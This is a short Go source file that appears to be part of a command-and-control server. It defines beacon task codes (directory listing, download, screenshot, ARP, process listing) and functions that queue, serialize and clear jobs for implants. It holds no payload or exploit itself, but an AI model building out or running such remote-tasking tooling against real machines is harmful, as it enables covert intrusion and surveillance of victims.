package main

import "encoding/binary"

const (
	ECHO       = 2
	LS         = 3
	DOWNLOAD   = 4
	SCREENSHOT = 5
	ARP        = 6
	PROCESS    = 7
)

type Job struct {
	command uint16
	shell   string
	funny   bool
}

func is_jobs_null(listener *Listener, i int) bool {
	if len(listener.Beacons[i].jobs) == 0 {
		return true
	} else {
		return false
	}
}

func make_fucker(listener *Listener, i int) []byte {
	res := make([]byte, 0)
	job := listener.Beacons[i].jobs[0]
	command := make([]byte, 2)
	binary.LittleEndian.PutUint16(command, job.command)

	res = append(res, command...)
	res = append(res, []byte(job.shell)...)

	listener.Beacons[i].jobs[0].funny = false

	return res
}

func remove_job(listener *Listener, i int) {
	var result []Job

	for _, job := range listener.Beacons[i].jobs {
		if job.funny {
			result = append(result, job)
		}
	}
	listener.Beacons[i].jobs = result
}
